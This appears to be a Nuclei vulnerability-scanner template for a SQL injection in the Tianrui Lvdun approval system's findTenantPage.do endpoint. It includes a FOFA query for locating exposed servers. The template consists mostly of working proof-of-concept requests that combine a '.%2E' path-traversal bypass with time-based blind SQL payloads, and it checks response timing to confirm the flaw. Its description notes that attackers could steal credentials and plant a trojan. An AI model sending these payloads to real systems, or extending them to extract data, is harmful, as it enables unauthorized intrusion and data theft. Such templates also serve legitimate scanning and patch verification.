id: tianrui-findTenantPage_do-sql-time

info:
  tags: tianrui-findTenantPage_do-sql-time
  name: 天锐绿盾审批系统 findTenantPage.do SQL注入漏洞
  author: xc
  severity: high
  description: |-
    fofa: app="TIPPAY-绿盾审批系统"
    天锐绿盾审批系统 findTenantPage.do 接口处存在sql注入漏洞,攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
http:
  - raw:
      - |
        POST /trwfe/service/.%2E/invoker/findTenantPage.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        sort=(SELECT * FROM (SELECT(SLEEP(4)))x)
      - |
        POST /trwfe/service/.%2E/invoker/findTenantPage.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        sort=(SELECT * FROM (SELECT(SLEEP(8)))x)
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and
